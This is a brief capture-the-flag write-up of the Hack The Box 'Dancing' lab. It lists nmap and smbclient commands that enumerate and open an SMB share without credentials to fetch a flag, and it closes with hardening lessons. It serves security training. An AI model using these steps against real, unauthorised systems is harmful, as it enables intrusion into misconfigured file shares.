---
title: "Lab: Dancing"
status: "Completed"
track: "HTB Starting Point"
date: "2025-09-01"
---

# Lab: Dancing

## Objective
SMB share accessible without creds (445/tcp).

## Methodology
1. **Recon** — Identify service/entry point.
2. **Finding** — Confirm misconfiguration/vulnerability.
3. **Exploit** — Execute the minimal steps to gain access.
4. **Post** — Retrieve proof, note hardening steps.

## Key Commands
```bash
nmap -sV -p 135,139,445 <host>
smbclient -L //<host> -N
smbclient // <host> /WorkShares -N
smb:> get flag.txt
```

## Lessons Learned
- Disable/lock down default or legacy services.
- Restrict network exposure; prefer MFA and least privilege.
- Monitor and alert on anomalous access.